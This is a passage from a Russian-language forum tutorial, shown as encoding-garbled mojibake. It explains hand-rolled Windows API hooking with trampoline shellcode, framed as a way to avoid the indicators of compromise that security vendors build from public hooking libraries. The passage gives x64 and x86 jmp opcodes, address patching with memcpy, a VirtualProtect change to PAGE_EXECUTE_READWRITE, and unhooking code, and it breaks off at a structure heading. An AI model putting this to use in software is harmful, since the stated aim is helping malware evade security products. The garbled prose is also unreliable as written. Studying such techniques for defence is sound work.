–î–æ —Å–∏—Ö –ø–æ—Ä –¥–ª—è —Ä–µ–∞–ª–∏–∑–∞—Ü–∏–∏ API-—Ö—É–∫–∏–Ω–≥–∞ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–ª–∏—Å—å –æ—Ç–∫—Ä—ã—Ç—ã–µ –±–∏–±–ª–∏–æ—Ç–µ–∫–∏. –û–¥–Ω–∞–∫–æ –æ—Å–Ω–æ–≤–Ω–∞—è –ø—Ä–æ–±–ª–µ–º–∞ —ç—Ç–æ–≥–æ –ø–æ–¥—Ö–æ–¥–∞ –∑–∞–∫–ª—é—á–∞–µ—Ç—Å—è –≤ —Ç–æ–º, —á—Ç–æ –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ —ç—Ç–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ –¥–æ—Å—Ç—É–ø–µ–Ω –ø—É–±–ª–∏—á–Ω–æ, —á—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏—Å—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—è–º –≤ –æ–±–ª–∞—Å—Ç–∏ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ –∏ –ø–æ—Å—Ç–∞–≤—â–∏–∫–∞–º –ø—Ä–æ–¥—É–∫—Ç–æ–≤ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏ —Å–æ–∑–¥–∞–≤–∞—Ç—å IoC(Indicators of compromise). –ü–æ —ç—Ç–æ–π –ø—Ä–∏—á–∏–Ω–µ –≤ —ç—Ç–æ–º –º–æ–¥—É–ª–µ API-—Ö—É–∫–∏–Ω–≥ –±—É–¥–µ—Ç —Ä–µ–∞–ª–∏–∑–æ–≤–∞–Ω –≤—Ä—É—á–Ω—É—é, —Ö–æ—Ç—è –∏ –Ω–µ —Ç–∞–∫ –∏–∑–æ—â—Ä–µ–Ω–Ω–æ, –∫–∞–∫ –≤ —Ä–∞–Ω–µ–µ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–Ω–Ω—ã—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫–∞—Ö, –Ω–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è –¥–æ—Å—Ç–∏–∂–µ–Ω–∏—è –∂–µ–ª–∞–µ–º–æ–≥–æ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –±–µ–∑ IoC.<br />
<br />
–°–æ–±—Å—Ç–≤–µ–Ω–Ω—ã–π –∫–æ–¥ –¥–ª—è —Ö—É–∫–∏–Ω–≥–∞ –º–æ–∂–µ—Ç –±—ã—Ç—å –ª—É—á—à–∏–º —Ä–µ—à–µ–Ω–∏–µ–º, –µ—Å–ª–∏ –∑–∞–¥–∞—á–∞ - —É—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ö—É–∫ –Ω–∞ –æ–¥–Ω—É —Ñ—É–Ω–∫—Ü–∏—é. –≠—Ç–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –∏–∑–±–µ–∂–∞—Ç—å –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—ã—Ö —É—Å–∏–ª–∏–π –ø–æ —Å–≤—è–∑—ã–≤–∞–Ω–∏—é –¥—Ä—É–≥–∏—Ö –±–∏–±–ª–∏–æ—Ç–µ–∫ –∏ —É–º–µ–Ω—å—à–∞–µ—Ç –∏—Ö –≤–ª–∏—è–Ω–∏–µ –Ω–∞ —Ä–∞–∑–º–µ—Ä –±–∏–Ω–∞—Ä–Ω–æ–≥–æ —Ñ–∞–π–ª–∞.<br />
<br />
<b>–°–æ–∑–¥–∞–Ω–∏–µ —Ç—Ä–∞–º–ø–ª–∏–Ω–Ω–æ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞</b><br />
<br />
–û–¥–∏–Ω –∏–∑ —Å–ø–æ—Å–æ–±–æ–≤ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞ –Ω–∞ —Ñ—É–Ω–∫—Ü–∏—é - –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞—Ç—å –µ—ë –ø–µ—Ä–≤—ã–µ –Ω–µ—Å–∫–æ–ª—å–∫–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –Ω–æ–≤—ã–º–∏. –≠—Ç–∏ –Ω–æ–≤—ã–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ - —ç—Ç–æ —Ç—Ä–∞–º–ø–ª–∏–Ω, –∫–æ—Ç–æ—Ä—ã–π –æ—Ç–≤–µ—á–∞–µ—Ç –∑–∞ –∏–∑–º–µ–Ω–µ–Ω–∏–µ –ø–æ—Ç–æ–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–∞ –∑–∞–º–µ–Ω—è—é—â—É—é —Ñ—É–Ω–∫—Ü–∏—é. –¢–∏–ø–∏—á–Ω—ã–º —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–º —è–≤–ª—è–µ—Ç—Å—è –Ω–µ–±–æ–ª—å—à–æ–π jmp-—à–µ–ª–ª–∫–æ–¥, –∫–æ—Ç–æ—Ä—ã–π –≤—ã–ø–æ–ª–Ω—è–µ—Ç –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é jmp –∫ –∞–¥—Ä–µ—Å—É —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä–∞—è –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. –ß—Ç–æ–±—ã –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—é jmp, –∞–¥—Ä–µ—Å, –∫ –∫–æ—Ç–æ—Ä–æ–º—É –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–π—Ç–∏, –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ —Ä–µ–≥–∏—Å—Ç—Ä–µ. –í –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–Ω–æ–º –ø—Ä–∏–º–µ—Ä–µ —Ä–µ–≥–∏—Å—Ç—Ä–æ–º –±—É–¥–µ—Ç eax –Ω–∞ 32-–±–∏—Ç–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ –∏ r10 –Ω–∞ 64-–±–∏—Ç–Ω–æ–º –ø—Ä–æ—Ü–µ—Å—Å–æ—Ä–µ. –ò–Ω—Å—Ç—Ä—É–∫—Ü–∏—è mov –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –≤ —ç—Ç–∏—Ö —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ö.<br />
<br />
–≠—Ç–æ–≥–æ –¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –¥–ª—è —Ç—Ä–∞–º–ø–ª–∏–Ω–∞: –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ mov –∏ jmp. –ì–ª—É–±–æ–∫–æ–µ –ø–æ–≥—Ä—É–∂–µ–Ω–∏–µ –≤ —Ç–æ, –∫–∞–∫ –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏, –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —Ü–µ–ª—å—é —ç—Ç–æ–π —Å—Ç–∞—Ç—å–∏. –ï—Å–ª–∏ –≤—ã —Ö–æ—Ç–∏—Ç–µ —É–∑–Ω–∞—Ç—å –±–æ–ª—å—à–µ, —Ç–æ –º–æ–∂–Ω–æ –ø–æ—Å–µ—Ç–∏—Ç—å felixcloutier.com/x86/mov –∏ felixcloutier.com/x86/jmp –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏.<br />
<br />
<b>64-–±–∏—Ç–Ω—ã–π Jump Shellcode</b><br />
<br />
64-–±–∏—Ç–Ω—ã–π jump-—à–µ–ª–ª–∫–æ–¥ –¥–æ–ª–∂–µ–Ω –≤—ã–≥–ª—è–¥–µ—Ç—å —Å–ª–µ–¥—É—é—â–∏–º –æ–±—Ä–∞–∑–æ–º:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>mov r10, pAddress
jmp r10</code></pre>
	</div>
</div><br />
–ì–¥–µ pAddress - —ç—Ç–æ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏, –∫ –∫–æ—Ç–æ—Ä–æ–π –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–π—Ç–∏ (–Ω–∞–ø—Ä–∏–º–µ—Ä, 0x0000FFFEC32A300). –ß—Ç–æ–±—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤ –∫–æ–¥–µ, –∏—Ö —Å–Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –≤ –æ–ø–∫–æ–¥—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pAddress
0x41, 0xFF, 0xE2                                            // jmp r10</code></pre>
	</div>
</div><br />
32-–±–∏—Ç–Ω—ã–π Jump Shellcode –ê –≤–µ—Ä—Å–∏—è –¥–ª—è 32-–±–∏—Ç:<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>mov eax, pAddress
jmp eax</code></pre>
	</div>
</div><br />
–¢–∞–∫–∂–µ –Ω—É–∂–Ω–æ –ø—Ä–µ–æ–±—Ä–∞–∑–æ–≤–∞—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ –≤ –æ–ø–∫–æ–¥—ã.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pAddress
0xFF, 0xE0                        // jmp eax</code></pre>
	</div>
</div><br />
–°–ª–µ–¥—É–µ—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ pAddress –ø—Ä–µ–¥—Å—Ç–∞–≤–ª–µ–Ω–æ –∫–∞–∫ NULL, —á—Ç–æ –æ–±—ä—è—Å–Ω—è–µ—Ç –ø–æ—Å–ª–µ–¥–æ–≤–∞—Ç–µ–ª—å–Ω–æ—Å—Ç—å 0x00. –≠—Ç–∏ –æ–ø–∫–æ–¥—ã 0x00 —è–≤–ª—è—é—Ç—Å—è –∑–∞–ø–æ–ª–Ω–∏—Ç–µ–ª—è–º–∏ <b>–∏ –±—É–¥—É—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω—ã –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è.<br />
<br />
–ü–æ–ª—É—á–µ–Ω–∏–µ pAddress</b><br />
<br />
–ü–æ—Å–∫–æ–ª—å–∫—É —Ö—É–∫–∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞—é—Ç—Å—è –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –∑–Ω–∞—á–µ–Ω–∏–µ pAddress –¥–æ–ª–∂–Ω–æ –±—ã—Ç—å –ø–æ–ª—É—á–µ–Ω–æ –∏ –¥–æ–±–∞–≤–ª–µ–Ω–æ –≤ —à–µ–ª–ª–∫–æ–¥ –≤–æ –≤—Ä–µ–º—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è. –ü–æ–ª—É—á–µ–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ –º–æ–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å —Å –ø–æ–º–æ—â—å—é GetProcAddress, –∏ –ø–æ—Å–ª–µ —ç—Ç–æ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å memcpy –¥–ª—è –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è –∞–¥—Ä–µ—Å–∞ –≤ –ø—Ä–∞–≤–∏–ª—å–Ω–æ–µ –º–µ—Å—Ç–æ –≤ —à–µ–ª–ª–∫–æ–¥–µ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>//64-–±–∏—Ç–Ω–æ–µ –ø—Ä–æ–ø–∞—Ç—á–∏–≤–∞–Ω–∏–µ
uint8_t        uTrampoline[] = {
            0x49, 0xBA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov r10, pFunctionToRun
            0x41, 0xFF, 0xE2                                            // jmp r10
};
uint64_t uPatch = (uint64_t)pAddress;
memcpy(&amp;uTrampoline[2], &amp;uPatch, sizeof(uPatch)); // –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ –≤ —Å–º–µ—â–µ–Ω–∏–µ &#039;2&#039; –≤ uTrampoline</code></pre>
	</div>
</div><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>//32-–±–∏—Ç–Ω–æ–µ –ø—Ä–æ–ø–∞—Ç—á–∏–≤–∞–Ω–∏–µ
uint8_t        uTrampoline[] = {
       0xB8, 0x00, 0x00, 0x00, 0x00,     // mov eax, pFunctionToRun
       0xFF, 0xE0                        // jmp eax
};
uint32_t uPatch = (uint32_t)pAddress;
memcpy(&amp;uTrampoline[1], &amp;uPatch, sizeof(uPatch)); // –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ –∞–¥—Ä–µ—Å–∞ –≤ —Å–º–µ—â–µ–Ω–∏–µ &#039;1&#039; –≤ uTrampoline</code></pre>
	</div>
</div><br />
–ö–∞–∫ —É–ø–æ–º–∏–Ω–∞–ª–æ—Å—å —Ä–∞–Ω–µ–µ, pAddress - —ç—Ç–æ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏, –∫ –∫–æ—Ç–æ—Ä–æ–π –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–π—Ç–∏. –¢–∏–ø—ã –¥–∞–Ω–Ω—ã—Ö uint32_t –∏ uint64_t –∏—Å–ø–æ–ª—å–∑—É—é—Ç—Å—è –¥–ª—è –æ–±–µ—Å–ø–µ—á–µ–Ω–∏—è –ø—Ä–∞–≤–∏–ª—å–Ω–æ–≥–æ –∫–æ–ª–∏—á–µ—Å—Ç–≤–∞ –±–∞–π—Ç–æ–≤ –∞–¥—Ä–µ—Å–∞, —Ç–æ –µ—Å—Ç—å 4 –±–∞–π—Ç–∞ –¥–ª—è 32-–±–∏—Ç–Ω—ã—Ö –º–∞—à–∏–Ω –∏ 8 –±–∞–π—Ç–æ–≤ –¥–ª—è 64-–±–∏—Ç–Ω—ã—Ö –º–∞—à–∏–Ω. uint32_t –∏–º–µ–µ—Ç —Ä–∞–∑–º–µ—Ä 4 –±–∞–π—Ç–∞, –∞ uint64_t - 8 –±–∞–π—Ç–æ–≤. –ó–∞—Ç–µ–º memcpy –ø–æ–º–µ—Å—Ç–∏—Ç –∞–¥—Ä–µ—Å –≤ —Ç—Ä–∞–º–ø–ª–∏–Ω, –ø–µ—Ä–µ–∑–∞–ø–∏—Å—ã–≤–∞—è –±–∞–π—Ç—ã-–∑–∞–ø–æ–ª–Ω–∏—Ç–µ–ª–∏ 0x00.<br />
<br />
<b>–ó–∞–ø–∏—Å—å —Ç—Ä–∞–º–ø–ª–∏–Ω–∞</b><br />
<br />
–ü–µ—Ä–µ–¥ –ø–µ—Ä–µ–∑–∞–ø–∏—Å—å—é –ø–µ—Ä–≤—ã—Ö –Ω–µ—Å–∫–æ–ª—å–∫–∏—Ö –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –ø–æ–¥–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–º —à–µ–ª–ª–∫–æ–¥–æ–º –≤–∞–∂–Ω–æ –ø–æ–º–µ—Ç–∏—Ç—å –ø–∞–º—è—Ç—å, –≤ –∫–æ—Ç–æ—Ä–æ–π –±—É–¥–µ—Ç –∑–∞–ø–∏—Å–∞–Ω —Ç—Ä–∞–º–ø–ª–∏–Ω, –∫–∞–∫ –¥–æ—Å—Ç—É–ø–Ω—É—é –¥–ª—è –∑–∞–ø–∏—Å–∏. –í –±–æ–ª—å—à–∏–Ω—Å—Ç–≤–µ —Å–ª—É—á–∞–µ–≤ —Ä–µ–≥–∏–æ–Ω –ø–∞–º—è—Ç–∏ –Ω–µ –±—É–¥–µ—Ç –¥–æ—Å—Ç—É–ø–µ–Ω –¥–ª—è –∑–∞–ø–∏—Å–∏, —á—Ç–æ –ø–æ—Ç—Ä–µ–±—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è WinAPI VirtualProtect –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –ø–∞–º—è—Ç–∏ –Ω–∞ PAGE_EXECUTE_READWRITE. –°—Ç–æ–∏—Ç –æ—Ç–º–µ—Ç–∏—Ç—å, —á—Ç–æ –ø–∞–º—è—Ç—å –¥–æ–ª–∂–Ω–∞ –±—ã—Ç—å –¥–æ—Å—Ç—É–ø–Ω–∞ –¥–ª—è –∑–∞–ø–∏—Å–∏ –∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è, –ø–æ—Ç–æ–º—É —á—Ç–æ –∫–æ–≥–¥–∞ –ø—Ä–æ–≥—Ä–∞–º–º–∞ –≤—ã–∑—ã–≤–∞–µ—Ç —Ñ—É–Ω–∫—Ü–∏—é, –µ–π –Ω—É–∂–Ω–æ –≤—ã–ø–æ–ª–Ω–∏—Ç—å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –Ω–µ –±—É–¥—É—Ç —Ä–∞–∑—Ä–µ—à–µ–Ω—ã –≤ –ø–∞–º—è—Ç–∏, –¥–æ—Å—Ç—É–ø–Ω–æ–π —Ç–æ–ª—å–∫–æ –¥–ª—è –∑–∞–ø–∏—Å–∏.<br />
<br />
–ò—Å—Ö–æ–¥—è –∏–∑ —ç—Ç–æ–≥–æ, —Ç—Ä–∞–º–ø–ª–∏–Ω –¥–æ–ª–∂–µ–Ω —Å–Ω–∞—á–∞–ª–∞ –∏–∑–º–µ–Ω–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è —Ü–µ–ª–µ–≤–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –∞ –∑–∞—Ç–µ–º —Å–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –Ω–∞–¥ –Ω–∏–º —à–µ–ª–ª–∫–æ–¥.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ò–∑–º–µ–Ω–µ–Ω–∏–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–π –ø–∞–º—è—Ç–∏ –≤ &#039;pFunctionToHook&#039; –Ω–∞ PAGE_EXECUTE_READWRITE
if (!VirtualProtect(pFunctionToHook, sizeof(uTrampoline), PAGE_EXECUTE_READWRITE, &amp;dwOldProtection)) {
    return FALSE;
}
// –ö–æ–ø–∏—Ä–æ–≤–∞–Ω–∏–µ —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–≤–æ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞ –≤ &#039;pFunctionToHook&#039;
memcpy(pFunctionToHook, uTrampoline, sizeof(uTrampoline));</code></pre>
	</div>
</div><br />
–ì–¥–µ pFunctionToHook - —ç—Ç–æ –∞–¥—Ä–µ—Å —Ñ—É–Ω–∫—Ü–∏–∏ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞, –∞ uTrampoline - —ç—Ç–æ jmp-—à–µ–ª–ª–∫–æ–¥.<br />
<br />
<b>–û—Ç–∫–ª—é—á–µ–Ω–∏–µ —Ö—É–∫–∞</b><br />
<br />
–ö–æ–≥–¥–∞ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è –∑–∞—Ö–≤–∞—á–µ–Ω–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è, —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–≤—ã–π —à–µ–ª–ª–∫–æ–¥ –¥–æ–ª–∂–µ–Ω —Ä–∞–±–æ—Ç–∞—Ç—å –∫–∞–∫ –¥–ª—è 64-–±–∏—Ç–Ω—ã—Ö, —Ç–∞–∫ –∏ –¥–ª—è 32-–±–∏—Ç–Ω—ã—Ö –∞—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä. –û–¥–Ω–∞–∫–æ –æ—Ç–∫–ª—é—á–µ–Ω–∏–µ –∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏ –Ω–µ –æ–±—Å—É–∂–¥–∞–ª–æ—Å—å. –î–ª—è —ç—Ç–æ–≥–æ –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –±–∞–π—Ç—ã, –∫–æ—Ç–æ—Ä—ã–µ –±—ã–ª–∏ –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω—ã —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–º, —Å–ª–µ–¥—É–µ—Ç –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å, –∏—Å–ø–æ–ª—å–∑—É—è –±—É—Ñ–µ—Ä, —Å–æ–¥–µ—Ä–∂–∞—â–∏–π —ç—Ç–∏ –±–∞–π—Ç—ã, –∫–æ—Ç–æ—Ä—ã–π –±—ã–ª —Å–æ–∑–¥–∞–Ω –¥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–≤–æ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞. –ó–∞—Ç–µ–º —ç—Ç–æ—Ç –±—É—Ñ–µ—Ä —Å–ª–µ–¥—É–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫–∞–∫ –∏—Å—Ö–æ–¥–Ω—ã–π –±—É—Ñ–µ—Ä –≤ —Ñ—É–Ω–∫—Ü–∏–∏ memcpy –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ —Ñ—É–Ω–∫—Ü–∏–∏.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>memcpy(pFunctionToHook, pOriginalBytes, sizeof(pOriginalBytes));</code></pre>
	</div>
</div><br />
–ì–¥–µ pFunctionToHook - —ç—Ç–æ –∞–¥—Ä–µ—Å –∑–∞—Ö–≤–∞—á–µ–Ω–Ω–æ–π —Ñ—É–Ω–∫—Ü–∏–∏, –∞ pOriginalBytes - —ç—Ç–æ –±—É—Ñ–µ—Ä, –∫–æ—Ç–æ—Ä—ã–π —Å–æ–¥–µ—Ä–∂–∏—Ç –æ—Ä–∏–≥–∏–Ω–∞–ª—å–Ω—ã–µ –±–∞–π—Ç—ã —Ñ—É–Ω–∫—Ü–∏–∏, –∫–æ—Ç–æ—Ä—ã–µ –¥–æ–ª–∂–Ω—ã –±—ã–ª–∏ –±—ã—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã –¥–æ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ö—É–∫–∞, –∏ —ç—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é –≤—ã–∑–æ–≤–∞ memcpy. –†–∞–∑–º–µ—Ä –±—É—Ñ–µ—Ä–∞ pOriginalBytes –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ç–∞–∫–∏–º –∂–µ, –∫–∞–∫ —Ä–∞–∑–º–µ—Ä —Ç—Ä–∞–º–ø–ª–∏–Ω–æ–≤–æ–≥–æ —à–µ–ª–ª–∫–æ–¥–∞, —Ç–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, –±—É–¥–µ—Ç –ø–µ—Ä–µ–∑–∞–ø–∏—Å–∞–Ω —Ç–æ–ª—å–∫–æ —à–µ–ª–ª–∫–æ–¥. –ù–∞–∫–æ–Ω–µ—Ü, —Ä–µ–∫–æ–º–µ–Ω–¥—É–µ—Ç—Å—è –≤–æ—Å—Å—Ç–∞–Ω–æ–≤–∏—Ç—å —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è –ø–∞–º—è—Ç–∏, —á—Ç–æ –º–æ–∂–Ω–æ —Å–¥–µ–ª–∞—Ç—å —Å –ø–æ–º–æ—â—å—é –ø—Ä–∏–≤–µ–¥–µ–Ω–Ω–æ–≥–æ –Ω–∏–∂–µ –∫–æ–¥–∞.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>if (!VirtualProtect(pFunctionToHook, sizeof(uTrampoline), dwOldProtection, &amp;dwOldProtection)) {
    return FALSE;
}</code></pre>
	</div>
</div><br />
–ì–¥–µ dwOldProtection - —ç—Ç–æ —Å—Ç–∞—Ä–æ–µ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏–µ –ø–∞–º—è—Ç–∏, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º–æ–µ –ø–µ—Ä–≤—ã–º –≤—ã–∑–æ–≤–æ–º VirtualProtect.<br />
<br />
<b>–°—Ç—Ä—É–∫—Ç—É—Ä–∞ HookSt </b><br />
<br />
